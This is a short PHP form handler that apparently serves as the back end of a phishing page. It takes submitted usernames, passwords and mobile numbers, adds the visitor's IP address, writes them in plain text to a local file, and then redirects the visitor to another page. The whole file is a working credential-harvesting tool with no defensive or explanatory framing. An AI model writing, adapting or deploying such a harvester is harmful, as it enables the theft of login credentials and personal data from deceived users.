<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['Username'];
    $password = $_POST['Password'];
    $mobile = $_POST['Mobile'];

    // Capture IP address and browser details
    $ip_address = $_SERVER['REMOTE_ADDR'];

    // Save data with IP & browser info
    $data = "IP Address: $ip_address\nUsername: $username\nPassword: $password\nMobile: $mobile\n\n";
    file_put_contents("data.txt", $data, FILE_APPEND);

    // Redirect
    header("Location: b.html");
    exit();
}
?>

